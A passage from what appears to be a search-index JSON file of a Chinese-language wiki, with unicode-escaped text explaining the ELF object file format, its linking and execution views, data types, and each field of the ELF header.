\u6587\u4ef6\u683c\u5f0f\u5206\u6790\uff0c\u5317\u4eac\u5927\u5b66\uff0c\u6ed5\u542f\u660e ELF-\u6467\u6bc1\u5723\u8bde","title":"ELF \u6587\u4ef6"},{"location":"executable/elf/elf_structure/#_1","text":"ELF \uff08Executable and Linkable Format\uff09\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f\u5728 Linux \u4e2d\u7684\u76ee\u6807\u6587\u4ef6\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u79cd\u7c7b\u578b \u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\uff08Relocatable File\uff09\uff0c\u5305\u542b\u7531\u7f16\u8bd1\u5668\u751f\u6210\u7684\u4ee3\u7801\u4ee5\u53ca\u6570\u636e\u3002\u94fe\u63a5\u5668\u4f1a\u5c06\u5b83\u4e0e\u5176\u5b83\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\u8d77\u6765\u4ece\u800c\u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u8fd9\u79cd\u6587\u4ef6\u7684\u540e\u7f00\u4e00\u822c\u4e3a .o \u3002 \u53ef\u6267\u884c\u6587\u4ef6\uff08Executable File\uff09\uff0c\u5c31\u662f\u6211\u4eec\u901a\u5e38\u5728 Linux \u4e2d\u6267\u884c\u7684\u7a0b\u5e8f\u3002 \u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08Shared Object File\uff09\uff0c\u5305\u542b\u4ee3\u7801\u548c\u6570\u636e\uff0c\u8fd9\u79cd\u6587\u4ef6\u662f\u6211\u4eec\u6240\u79f0\u7684\u5e93\u6587\u4ef6\uff0c\u4e00\u822c\u4ee5 .so \u7ed3\u5c3e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5b83\u6709\u4ee5\u4e0b\u4e24\u79cd\u4f7f\u7528\u60c5\u666f \u94fe\u63a5\u5668\uff08Link eDitor, ld\uff09\u53ef\u80fd\u4f1a\u5904\u7406\u5b83\u548c\u5176\u5b83\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u751f\u6210\u53e6\u5916\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u3002 \u52a8\u6001\u94fe\u63a5\u5668\uff08Dynamic Linker\uff09\u5c06\u5b83\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5176\u5b83\u5171\u4eab\u76ee\u6807\u7ec4\u5408\u5728\u4e00\u8d77\u751f\u6210\u8fdb\u7a0b\u955c\u50cf\u3002 \u5173\u4e8eLink eDitor\u7684\u547d\u540d\uff0c https://en.wikipedia.org/wiki/GNU_linker \u76ee\u6807\u6587\u4ef6\u7531\u6c47\u7f16\u5668\u548c\u94fe\u63a5\u5668\u521b\u5efa\uff0c\u662f\u6587\u672c\u7a0b\u5e8f\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u3002\u90a3\u4e9b\u9700\u8981\u865a\u62df\u673a\u624d\u80fd\u591f\u6267\u884c\u7684\u7a0b\u5e8f(Java)\u4e0d\u5c5e\u4e8e\u8fd9\u4e00\u8303\u56f4\u3002 \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e8e ELF \u7684\u6587\u4ef6\u683c\u5f0f\u3002","title":"\u7b80\u4ecb"},{"location":"executable/elf/elf_structure/#_2","text":"\u76ee\u6807\u6587\u4ef6\u65e2\u4f1a\u53c2\u4e0e\u7a0b\u5e8f\u94fe\u63a5\u53c8\u4f1a\u53c2\u4e0e\u7a0b\u5e8f\u6267\u884c\u3002\u51fa\u4e8e\u65b9\u4fbf\u6027\u548c\u6548\u7387\u8003\u8651\uff0c\u6839\u636e\u8fc7\u7a0b\u7684\u4e0d\u540c\uff0c\u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u63d0\u4f9b\u4e86\u5176\u5185\u5bb9\u7684\u4e24\u79cd\u5e76\u884c\u89c6\u56fe\uff0c\u5982\u4e0b \u9996\u5148\uff0c\u6211\u4eec\u6765 \u5173\u6ce8\u4e00\u4e0b\u94fe\u63a5\u89c6\u56fe \u3002 \u6587\u4ef6\u5f00\u59cb\u5904\u662f ELF \u5934\u90e8\uff08 ELF Header \uff09\uff0c\u5b83\u7ed9\u51fa\u4e86\u6574\u4e2a\u6587\u4ef6\u7684\u7ec4\u7ec7\u60c5\u51b5\u3002 \u5982\u679c\u7a0b\u5e8f\u5934\u90e8\u8868\uff08Program Header Table\uff09\u5b58\u5728\u7684\u8bdd\uff0c\u5b83\u4f1a\u544a\u8bc9\u7cfb\u7edf\u5982\u4f55\u521b\u5efa\u8fdb\u7a0b\u3002\u7528\u4e8e\u751f\u6210\u8fdb\u7a0b\u7684\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u5177\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u4f46\u662f\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e0d\u9700\u8981\u8fd9\u4e2a\u8868\u3002 \u8282\u533a\u90e8\u5206\u5305\u542b\u5728\u94fe\u63a5\u89c6\u56fe\u4e2d\u8981\u4f7f\u7528\u7684\u5927\u90e8\u5206\u4fe1\u606f\uff1a\u6307\u4ee4\u3001\u6570\u636e\u3001\u7b26\u53f7\u8868\u3001\u91cd\u5b9a\u4f4d\u4fe1\u606f\u7b49\u7b49\u3002 \u8282\u533a\u5934\u90e8\u8868\uff08Section Header Table\uff09\u5305\u542b\u4e86\u63cf\u8ff0\u6587\u4ef6\u8282\u533a\u7684\u4fe1\u606f\uff0c\u6bcf\u4e2a\u8282\u533a\u5728\u8868\u4e2d\u90fd\u6709\u4e00\u4e2a\u8868\u9879\uff0c\u4f1a\u7ed9\u51fa\u8282\u533a\u540d\u79f0\u3001\u8282\u533a\u5927\u5c0f\u7b49\u4fe1\u606f\u3002\u7528\u4e8e\u94fe\u63a5\u7684\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u6709\u8282\u533a\u5934\u90e8\u8868\uff0c\u5176\u5b83\u76ee\u6807\u6587\u4ef6\u5219\u65e0\u6240\u8c13\uff0c\u53ef\u4ee5\u6709\uff0c\u4e5f\u53ef\u4ee5\u6ca1\u6709\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u5173\u4e8e\u94fe\u63a5\u89c6\u56fe\u6bd4\u8f83\u5f62\u8c61\u7684\u5c55\u793a \u5bf9\u4e8e \u6267\u884c\u89c6\u56fe \u6765\u8bf4\uff0c\u5176\u4e3b\u8981\u7684\u4e0d\u540c\u70b9\u5728\u4e8e\u6ca1\u6709\u4e86section\uff0c\u800c\u6709\u4e86\u591a\u4e2asegment\u3002\u5176\u5b9e\u8fd9\u91cc\u7684 segment \u5927\u90fd\u662f\u6765\u6e90\u4e8e\u94fe\u63a5\u89c6\u56fe\u4e2d\u7684 section\u3002 \u6ce8\u610f: \u5c3d\u7ba1\u56fe\u4e2d\u662f\u6309\u7167 ELF \u5934\uff0c\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u8282\u533a\uff0c\u8282\u533a\u5934\u90e8\u8868\u7684\u987a\u5e8f\u6392\u5217\u7684\u3002\u4f46\u5b9e\u9645\u4e0a\u9664\u4e86 ELF \u5934\u90e8\u8868\u4ee5\u5916\uff0c\u5176\u5b83\u90e8\u5206\u90fd\u6ca1\u6709\u4e25\u683c\u7684\u7684\u987a\u5e8f\u3002","title":"\u6587\u4ef6\u683c\u5f0f"},{"location":"executable/elf/elf_structure/#_3","text":"ELF \u6587\u4ef6\u683c\u5f0f\u652f\u6301 8 \u4f4d/32 \u4f4d\u4f53\u7cfb\u7ed3\u6784\u3002\u5f53\u7136\uff0c\u8fd9\u79cd\u683c\u5f0f\u662f\u53ef\u4ee5\u6269\u5c55\u7684\uff0c\u4e5f\u53ef\u4ee5\u652f\u6301\u66f4\u5c0f\u7684\u6216\u8005\u66f4\u5927\u4f4d\u6570\u7684\u5904\u7406\u5668\u67b6\u6784\u3002\u56e0\u6b64\uff0c\u76ee\u6807\u6587\u4ef6\u4f1a\u5305\u542b\u4e00\u4e9b\u63a7\u5236\u6570\u636e\uff0c\u8fd9\u90e8\u5206\u6570\u636e\u8868\u660e\u4e86\u76ee\u6807\u6587\u4ef6\u6240\u4f7f\u7528\u7684\u67b6\u6784\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u5b83\u53ef\u4ee5\u88ab\u901a\u7528\u7684\u65b9\u5f0f\u6765\u8bc6\u522b\u548c\u89e3\u91ca\u3002\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u5176\u5b83\u6570\u636e\u91c7\u7528\u76ee\u7684\u5904\u7406\u5668\u7684\u683c\u5f0f\u8fdb\u884c\u7f16\u7801\uff0c\u4e0e\u5728\u4f55\u79cd\u673a\u5668\u4e0a\u521b\u5efa\u6ca1\u6709\u5173\u7cfb\u3002\u8fd9\u91cc\u5176\u5b9e\u60f3\u8868\u660e\u7684\u610f\u601d\u76ee\u6807\u6587\u4ef6\u53ef\u4ee5\u8fdb\u884c\u4ea4\u53c9\u7f16\u8bd1\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 x86 \u5e73\u53f0\u751f\u6210 arm \u5e73\u53f0\u7684\u53ef\u6267\u884c\u4ee3\u7801\u3002 \u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u6570\u636e\u7ed3\u6784\u90fd\u9075\u4ece\u201c\u81ea\u7136\u201d\u5927\u5c0f\u548c\u5bf9\u9f50\u89c4\u5219\u3002\u5982\u4e0b \u540d\u79f0 \u957f\u5ea6 \u5bf9\u9f50\u65b9\u5f0f \u7528\u9014 Elf32_Addr 4 4 \u65e0\u7b26\u53f7\u7a0b\u5e8f\u5730\u5740 Elf32_Half 2 2 \u65e0\u7b26\u53f7\u534a\u6574\u578b Elf32_Off 4 4 \u65e0\u7b26\u53f7\u6587\u4ef6\u504f\u79fb Elf32_Sword 4 4 \u6709\u7b26\u53f7\u5927\u6574\u578b Elf32_Word 4 4 \u65e0\u7b26\u53f7\u5927\u6574\u578b unsigned char 1 1 \u65e0\u7b26\u53f7\u5c0f\u6574\u578b \u5982\u679c\u5fc5\u8981\uff0c\u6570\u636e\u7ed3\u6784\u53ef\u4ee5\u5305\u542b\u663e\u5f0f\u5730\u8865\u9f50\u6765\u786e\u4fdd 4 \u5b57\u8282\u5bf9\u8c61\u6309 4 \u5b57\u8282\u5bf9\u9f50\uff0c\u5f3a\u5236\u6570\u636e\u7ed3\u6784\u7684\u5927\u5c0f\u662f 4 \u7684\u6574\u6570\u500d\u7b49\u7b49\u3002\u6570\u636e\u540c\u6837\u9002\u7528\u662f\u5bf9\u9f50\u7684\u3002\u56e0\u6b64\uff0c\u5305\u542b\u4e00\u4e2a Elf32_Addr \u7c7b\u578b\u6210\u5458\u7684\u7ed3\u6784\u4f53\u4f1a\u5728\u6587\u4ef6\u4e2d\u7684 4 \u5b57\u8282\u8fb9\u754c\u5904\u5bf9\u9f50\u3002 \u4e3a\u4e86\u5177\u6709\u53ef\u79fb\u690d\u6027\uff0cELF \u6587\u4ef6\u4e0d\u4f7f\u7528\u4f4d\u57df\u3002","title":"\u6570\u636e\u5f62\u5f0f"},{"location":"executable/elf/elf_structure/#_4","text":"\u5f85\u3002 \u6ce8\uff1a\u5728\u4e0b\u9762\u7684\u4ecb\u7ecd\u4e2d\uff0c\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\u3002","title":"\u5b57\u7b26\u8868\u793a"},{"location":"executable/elf/elf_structure/#elf-header","text":"ELF Header \u63cf\u8ff0\u4e86 ELF \u6587\u4ef6\u7684\u6982\u8981\u4fe1\u606f\uff0c\u5229\u7528\u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u53ef\u4ee5\u7d22\u5f15\u5230 ELF \u6587\u4ef6\u7684\u5168\u90e8\u4fe1\u606f\uff0c\u6570\u636e\u7ed3\u6784\u5982\u4e0b\uff1a #define EI_NIDENT 16 typedef struct { unsigned char e_ident [ EI_NIDENT ]; ELF32_Half e_type ; ELF32_Half e_machine ; ELF32_Word e_version ; ELF32_Addr e_entry ; ELF32_Off e_phoff ; ELF32_Off e_shoff ; ELF32_Word e_flags ; ELF32_Half e_ehsize ; ELF32_Half e_phentsize ; ELF32_Half e_phnum ; ELF32_Half e_shentsize ; ELF32_Half e_shnum ; ELF32_Half e_shstrndx ; } Elf32_Ehdr ; \u5176\u4e2d\u6bcf\u4e2a\u6210\u5458\u90fd\u662f e \u5f00\u5934\u7684\uff0c\u5b83\u4eec\u5e94\u8be5\u90fd\u662f ELF \u7684\u7f29\u5199\u3002\u6bcf\u4e2a\u6210\u5458\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b\u3002","title":"ELF Header"},{"location":"executable/elf/elf_structure/#e_ident","text":"\u6b63\u5982\u4e4b\u524d\u6240\u8bf4\uff0cELF \u63d0\u4f9b\u4e86\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u6846\u67b6\uff0c\u4ee5\u4fbf\u4e8e\u652f\u6301\u591a\u79cd\u5904\u7406\u5668\uff0c\u591a\u79cd\u7f16\u7801\u683c\u5f0f\u7684\u673a\u5668\u3002\u8be5\u53d8\u91cf\u7ed9\u51fa\u4e86\u7528\u4e8e\u89e3\u7801\u548c\u89e3\u91ca\u6587\u4ef6\u4e2d\u4e0e\u673a\u5668\u65e0\u5173\u7684\u6570\u636e\u7684\u65b9\u5f0f\u3002\u8fd9\u4e2a\u6570\u7ec4\u5bf9\u4e8e\u4e0d\u540c\u7684\u4e0b\u6807\u7684\u542b\u4e49\u5982\u4e0b \u5b8f\u540d\u79f0 \u4e0b\u6807 \u76ee\u7684 EI_MAG0 0 \u6587\u4ef6\u6807\u8bc6 EI_MAG1 1 \u6587\u4ef6\u6807\u8bc6 EI_MAG2 2 \u6587\u4ef6\u6807\u8bc6 EI_MAG3 3 \u6587\u4ef6\u6807\u8bc6 EI_CLASS 4 \u6587\u4ef6\u7c7b EI_DATA 5 \u6570\u636e\u7f16\u7801 EI_VERSION 6 \u6587\u4ef6\u7248\u672c EI_PAD 7 \u8865\u9f50\u5b57\u8282\u5f00\u59cb\u5904 \u5176\u4e2d\uff0c e_ident[EI_MAG0] \u5230 e_ident[EI_MAG3] \uff0c\u5373\u6587\u4ef6\u7684\u59344\u4e2a\u5b57\u8282\uff0c\u88ab\u79f0\u4f5c\u201c\u9b54\u6570\u201d\uff0c\u6807\u8bc6\u8be5\u6587\u4ef6\u662f\u4e00\u4e2aELF\u76ee\u6807\u6587\u4ef6\u3002 \u81f3\u4e8e\u5f00\u5934\u4e3a\u4ec0\u4e48\u662f0x7f\uff0c\u5e76\u6ca1\u6709\u4ed4\u7ec6\u53bb\u67e5\u8fc7 \u3002 \u540d\u79f0 \u503c \u4f4d\u7f6e ELFMAG0 0x7f e_ident[EI_MAG0] ELFMAG1 \u2018E\u2019 e_ident[EI_MAG1] ELFMAG2 \u2018L\u2019 e_ident[EI_MAG2] ELFMAG3 \u2018F\u2019 e_ident[EI_MAG3] e_ident[EI_CLASS] \u4e3a e_ident[EI_MAG3] \u7684\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u6807\u8bc6\u6587\u4ef6\u7684\u7c7b\u578b\u6216\u5bb9\u91cf\u3002 \u540d\u79f0 \u503c \u610f\u4e49 ELFCLASSNONE 0 \u65e0\u6548\u7c7b\u578b ELFCLASS32 1 32\u4f4d\u6587\u4ef6 ELFCLASS64 2 64\u4f4d\u6587\u4ef6 ELF \u6587\u4ef6\u7684\u8bbe\u8ba1\u4f7f\u5f97\u5b83\u53ef\u4ee5\u5728\u591a\u79cd\u5b57\u8282\u957f\u5ea6\u7684\u673a\u5668\u4e4b\u95f4\u79fb\u690d\uff0c\u800c\u4e0d\u9700\u8981\u5f3a\u5236\u89c4\u5b9a\u673a\u5668\u7684\u6700\u957f\u5b57\u8282\u957f\u5ea6\u548c\u6700\u77ed\u5b57\u8282\u957f\u5ea6\u3002 ELFCLASS32 \u7c7b\u578b\u652f\u6301\u6587\u4ef6\u5927\u5c0f\u548c\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e0a\u9650\u4e3a 4GB \u7684\u673a\u5668\uff1b\u5b83\u4f7f\u7528\u4e0a\u8ff0\u5b9a\u4e49\u4e2d\u7684\u57fa\u672c\u7c7b\u578b\u3002 ELFCLASS64 \u7c7b\u578b\u7528\u4e8e 64 \u4f4d\u67b6\u6784\u3002 e_ident[EI_DATA] \u5b57\u8282\u7ed9\u51fa\u4e86\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u7279\u5b9a\u5904\u7406\u5668\u6570\u636e\u7684\u7f16\u7801\u65b9\u5f0f\u3002\u4e0b\u9762\u662f\u76ee\u524d\u5df2\u5b9a\u4e49\u7684\u7f16\u7801\uff1a \u540d\u79f0 \u503c \u610f\u4e49 ELFDATANONE 0 \u65e0\u6548\u6570\u636e\u7f16\u7801 ELFDATA2LSB 1 \u5c0f\u7aef ELFDATA2MSB 2 \u5927\u7aef \u5176\u5b83\u503c\u88ab\u4fdd\u7559\uff0c\u5728\u672a\u6765\u5fc5\u8981\u65f6\u5c06\u88ab\u8d4b\u4e88\u65b0\u7684\u7f16\u7801\u3002 \u6587\u4ef6\u6570\u636e\u7f16\u7801\u65b9\u5f0f\u8868\u660e\u4e86\u6587\u4ef6\u5185\u5bb9\u7684\u89e3\u6790\u65b9\u5f0f\u3002\u6b63\u5982\u4e4b\u524d\u6240\u8ff0\uff0c ELFCLASS32 \u7c7b\u578b\u6587\u4ef6\u4f7f\u7528\u4e86\u5177\u67091\uff0c2 \u548c 4 \u5b57\u8282\u7684\u53d8\u91cf\u7c7b\u578b\u3002\u5bf9\u4e8e\u5df2\u5b9a\u4e49\u7684\u4e0d\u540c\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u5176\u8868\u793a\u5982\u4e0b\u6240\u793a\uff0c\u5176\u4e2d\u5b57\u8282\u53f7\u5728\u5de6\u4e0a\u89d2\u3002 ELFDATA2LSB \u7f16\u7801\u4f7f\u7528\u8865\u7801\uff0c\u6700\u4f4e\u6709\u6548\u4f4d\uff08Least Significant Byte\uff09\u5360\u7528\u6700\u4f4e\u5730\u5740\u3002 ELFDATA2MSB \u7f16\u7801\u4f7f\u7528\u8865\u7801\uff0c\u6700\u9ad8\u6709\u6548\u4f4d\uff08Most Significant Byte\uff09\u5360\u7528\u6700\u4f4e\u5730\u5740\u3002 e_ident[EI_DATA] \u7ed9\u51fa\u4e86 ELF \u5934\u7684\u7248\u672c\u53f7\u3002\u76ee\u524d\u8fd9\u4e2a\u503c\u5fc5\u987b\u662f EV_CURRENT \uff0c\u5373\u4e4b\u524d\u5df2\u7ecf\u7ed9\u51fa\u7684 e_version \u3002 e_ident[EI_PAD] \u7ed9\u51fa\u4e86 e_ident \u4e2d\u672a\u4f7f\u7528\u5b57\u8282\u7684\u5f00\u59cb\u5730\u5740\u3002\u8fd9\u4e9b\u5b57\u8282\u88ab\u4fdd\u7559\u5e76\u7f6e\u4e3a0\uff1b\u5904\u7406\u76ee\u6807\u6587\u4ef6\u7684\u7a0b\u5e8f\u5e94\u8be5\u5ffd\u7565\u5b83\u4eec\u3002\u5982\u679c\u4e4b\u540e\u8fd9\u4e9b\u5b57\u8282\u88ab\u4f7f\u7528\uff0cEI_PAD\u7684\u503c\u5c31\u4f1a\u6539\u53d8\u3002","title":"e_ident"},{"location":"executable/elf/elf_structure/#e_type","text":"e_type \u6807\u8bc6\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u3002 \u540d\u79f0 \u503c \u610f\u4e49 ET_NONE 0 \u65e0\u6587\u4ef6\u7c7b\u578b ET_REL 1 \u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6 ET_EXEC 2 \u53ef\u6267\u884c\u6587\u4ef6 ET_DYN 3 \u5171\u4eab\u76ee\u6807\u6587\u4ef6 ET_CORE 4 \u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6 ET_LOPROC 0xff00 \u5904\u7406\u5668\u6307\u5b9a\u4e0b\u9650 ET_HIPROC 0xffff \u5904\u7406\u5668\u6307\u5b9a\u4e0a\u9650 \u867d\u7136\u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6\u7684\u5185\u5bb9\u6ca1\u6709\u88ab\u8be6\u7ec6\u8bf4\u660e\uff0c\u4f46 ET_CORE \u8fd8\u662f\u88ab\u4fdd\u7559\u7528\u4e8e\u6807\u5fd7\u6b64\u7c7b\u6587\u4ef6\u3002\u4ece ET_LOPROC \u5230 ET_HIPROC (\u5305\u62ec\u8fb9\u754c)\u88ab\u4fdd\u7559\u7528\u4e8e\u5904\u7406\u5668\u6307\u5b9a\u7684\u573a\u666f\u3002\u5176\u5b83\u503c\u5728\u672a\u6765\u5fc5\u8981\u65f6\u53ef\u88ab\u8d4b\u4e88\u65b0\u7684\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u3002","title":"e_type"},{"location":"executable/elf/elf_structure/#e_machine","text":"\u8fd9\u4e00\u9879\u6307\u5b9a\u4e86\u5f53\u524d\u6587\u4ef6\u53ef\u4ee5\u8fd0\u884c\u7684\u673a\u5668\u67b6\u6784\u3002 \u540d\u79f0 \u503c \u610f\u4e49 EM_NONE 0 \u65e0\u673a\u5668\u7c7b\u578b EM_M32 1 AT&T WE 32100 EM_SPARC 2 SPARC EM_386 3 Intel 80386 EM_68K 4 Motorola 68000 EM_88K 5 Motorola 88000 EM_860 7 Intel 80860 EM_MIPS 8 MIPS RS3000 \u5176\u4e2d EM \u5e94\u8be5\u662f ELF Machine \u7684\u7b80\u5199\u3002 \u5176\u5b83\u503c\u88ab\u5728\u672a\u6765\u5fc5\u8981\u65f6\u7528\u4e8e\u65b0\u7684\u673a\u5668\u3002 \u6b64\u5916\uff0c\u7279\u5b9a\u5904\u7406\u5668\u7684ELF\u540d\u79f0\u4f7f\u7528\u673a\u5668\u540d\u79f0\u6765\u8fdb\u884c\u533a\u5206\uff0c\u4e00\u822c\u6807\u5fd7\u4f1a\u6709\u4e2a\u524d\u7f00 EF_ \uff08ELF Flag\uff09\u3002\u4f8b\u5982\uff0c\u5728 EM_XYZ \u673a\u5668\u4e0a\u540d\u53eb WIDGET \u7684\u6807\u5fd7\u5c06\u88ab\u79f0\u4e3a EF_XYZ_WIDGET \u3002","title":"e_machine"},{"location":"executable/elf/elf_structure/#e_version","text":"\u6807\u8bc6\u76ee\u6807\u6587\u4ef6\u7684\u7248\u672c\u3002 \u540d\u79f0 \u503c \u610f\u4e49 EV_NONE 0 \u65e0\u6548\u7248\u672c EV_CURRENT 1 \u5f53\u524d\u7248\u672c 1 \u8868\u793a\u521d\u59cb\u6587\u4ef6\u683c\u5f0f\uff1b\u672a\u6765\u6269\u5c55\u65b0\u7684\u7248\u672c\u7684\u65f6\u5019(extensions)\u5c06\u4f7f\u7528\u66f4\u5927\u7684\u6570\u5b57\u3002\u867d\u7136\u5728\u4e0a\u9762\u503c EV_CURRENT \u4e3a1\uff0c\u4f46\u662f\u4e3a\u4e86\u53cd\u6620\u5f53\u524d\u7248\u672c\u53f7\uff0c\u5b83\u53ef\u80fd\u4f1a\u6539\u53d8\uff0c \u6bd4\u5982ELF\u5230\u73b0\u5728\u4e5f\u5c31\u662f1.2\u7248\u672c\u3002","title":"e_version"},{"location":"executable/elf/elf_structure/#e_entry","text":"\u8fd9\u4e00\u9879\u4e3a\u7cfb\u7edf\u8f6c\u4ea4\u63a7\u5236\u6743\u7ed9 ELF \u4e2d\u76f8\u5e94\u4ee3\u7801\u7684\u865a\u62df\u5730\u5740\u3002\u5982\u679c\u6ca1\u6709\u76f8\u5173\u7684\u5165\u53e3\u9879\uff0c\u5219\u8fd9\u4e00\u9879\u4e3a0\u3002","title":"e_entry"},{"location":"executable/elf/elf_structure/#e_phoff","text":"\u8fd9\u4e00\u9879\u7ed9\u51fa \u7a0b\u5e8f\u5934\u90e8\u8868 \u5728\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u504f\u79fb\uff08 Program Header table OFFset \uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u5219\u4e3a0\u3002","title":"e_phoff"},{"location":"executable/elf/elf_structure/#e_shoff","text":"\u8fd9\u4e00\u9879\u7ed9\u51fa \u8282\u5934\u8868 \u5728\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u504f\u79fb\uff08 Section Header table OFFset \uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u5934\u8868\uff0c\u5219\u4e3a0\u3002","title":"e_shoff"},{"location":"executable/elf/elf_structure/#e_flags","text":"\u8fd9\u4e00\u9879\u7ed9\u51fa\u6587\u4ef6\u4e2d\u4e0e\u7279\u5b9a\u5904\u7406\u5668\u76f8\u5173\u7684\u6807\u5fd7\uff0c\u8fd9\u4e9b\u6807\u5fd7\u547d\u540d\u683c\u5f0f\u4e3a EF_machine_flag \u3002","title":"e_flags"},{"location":"executable/elf/elf_structure/#e_ehsize","text":"\u8fd9\u4e00\u9879\u7ed9\u51fa ELF \u6587\u4ef6\u5934\u90e8\u7684\u5b57\u8282\u957f\u5ea6\uff08ELF Header Size\uff09\u3002","title":"e_ehsize"},{"location":"executable/elf/elf_structure/#e_phentsize","text":"\u8fd9\u4e00\u9879\u7ed9\u51fa\u7a0b\u5e8f\u5934\u90e8\u8868\u4e2d\u6bcf\u4e2a\u8868\u9879\u7684\u5b57\u8282\u957f\u5ea6\uff08 Program Header ENTry SIZE \uff09\u3002\u6bcf\u4e2a\u8868\u9879\u7684\u5927\u5c0f\u76f8\u540c\u3002","title":"e_phentsize"},{"location":"executable/elf/elf_structure/#e_phnum","text":"\u8fd9\u4e00\u9879\u7ed9\u51fa\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u9879\u6570\uff08 Program Header entry NUMber \uff09\u3002\u56e0\u6b64\uff0c e_phnum \u4e0e e_phentsize \u7684\u4e58\u79ef\u5373\u4e3a\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u5b57\u8282\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a0\u3002","title":"e_phnum"},{"location":"executable/elf/elf_structure/#e_shentsize","text":"\u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u7684\u5b57\u8282\u957f\u5ea6\uff08 Section Header ENTry SIZE \uff09\u3002\u4e00\u4e2a\u8282\u5934\u662f\u8282\u5934\u8868\u4e2d\u7684\u4e00\u9879\uff1b\u8282\u5934\u8868\u4e2d\u6240\u6709\u9879\u5360\u636e\u7684\u7a7a\u95f4\u5927\u5c0f\u76f8\u540c\u3002","title":"e_shentsize"},{"location":"executable/elf/elf_structure/#e_shnum","text":"\u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u8868\u4e2d\u7684\u9879\u6570\uff08 Section Header NUMber \uff09\u3002\u56e0\u6b64\uff0c e_shnum \u4e0e e_shentsize \u7684\u4e58\u79ef\u5373\u4e3a\u8282\u5934\u8868\u7684\u5b57\u8282\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u5934\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a0\u3002","title":"e_shnum"},{"location":"executable/elf/elf_structure/#e_shstrndx","text":"\u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u8868\u4e2d\u4e0e\u8282\u540d\u5b57\u7b26\u4e32\u8868\u76f8\u5173\u7684\u8868\u9879\u7684\u7d22\u5f15\u503c\uff08 Section Header table InDeX related with section name STRing table \uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u540d\u5b57\u7b26\u4e32\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a SHN_UNDEF \u3002\u5173\u4e8e\u7ec6\u8282\u7684\u4ecb\u7ecd\uff0c\u8bf7\u53c2\u8003\u540e\u9762\u7684\u201c\u8282\u201d\u548c\u201c\u5b57\u7b26\u4e32\u8868\u201d\u90e8\u5206\u3002","title":"e_shstrndx"},{"location":"executable/elf/elf_structure/#program-header-table","text":"","title":"Program Header Table"},{"location":"executable/elf/elf_structure/#_5","text":"Program Header Table \u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u6bcf\u4e00\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u662f Elf32_Phdr \uff0c\u63cf\u8ff0\u4e86\u4e00\u4e2a\u6bb5\u6216\u8005\u5176\u5b83\u7cfb\u7edf\u5728\u51c6\u5907\u7a0b\u5e8f\u6267\u884c\u65f6\u6240\u9700\u8981\u7684\u4fe1\u606f\u3002\u5176\u4e2d\uff0cELF \u5934\u4e2d\u7684 e_phentsize \u548c e_phnum \u6307\u5b9a\u4e86\u8be5\u6570\u7ec4\u6bcf\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\u4ee5\u53ca\u5143\u7d20\u4e2a\u6570\u3002\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u7684\u6bb5\u5305\u542b\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u8282\u3002 